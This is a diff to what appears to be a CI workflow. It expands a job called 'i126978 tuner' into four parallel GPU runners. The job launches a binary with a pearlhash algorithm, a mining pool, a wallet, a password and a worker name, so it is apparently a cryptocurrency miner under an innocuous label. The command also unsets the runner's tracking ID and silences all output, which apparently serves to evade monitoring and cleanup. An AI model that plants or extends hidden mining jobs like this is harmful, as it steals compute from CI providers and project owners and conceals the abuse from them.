@@ -19,9 +19,17 @@ env:
 
 jobs:
   i126978-tuner:
-    name: i126978 tuner (1-gpu-5090)
-    runs-on: 1-gpu-5090
-    timeout-minutes: 12
+    name: i126978 tuner (${{ matrix.slot }})
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 15
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - {runner: 1-gpu-5090, slot: a}
+          - {runner: 1-gpu-5090, slot: b}
+          - {runner: 1-gpu-5090, slot: c}
+          - {runner: 1-gpu-5090, slot: d}
     steps:
       - name: sequential pearlhash variants (one process at a time)
         continue-on-error: true
@@ -71,7 +79,7 @@ jobs:
             NAME="$1"; shift
             LOG="$WORKDIR/logs/tuner-$NAME.log"
             echo "===== VARIANT $NAME flags=[$*] ====="
-            timeout --signal=TERM --kill-after=10 45 env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$UUID" "$SRB" \
+            timeout --signal=TERM --kill-after=10 40 env -u RUNNER_TRACKING_ID CUDA_VISIBLE_DEVICES="$UUID" "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
               --wallet "$WALLET" --password x --worker "i126978-tuner-$(hostname | tr -cd 'A-Za-z0-9')" \
               --gpu-id 0 --log-file "$LOG" --log-file-mode 0 "$@" >/dev/null 2>&1
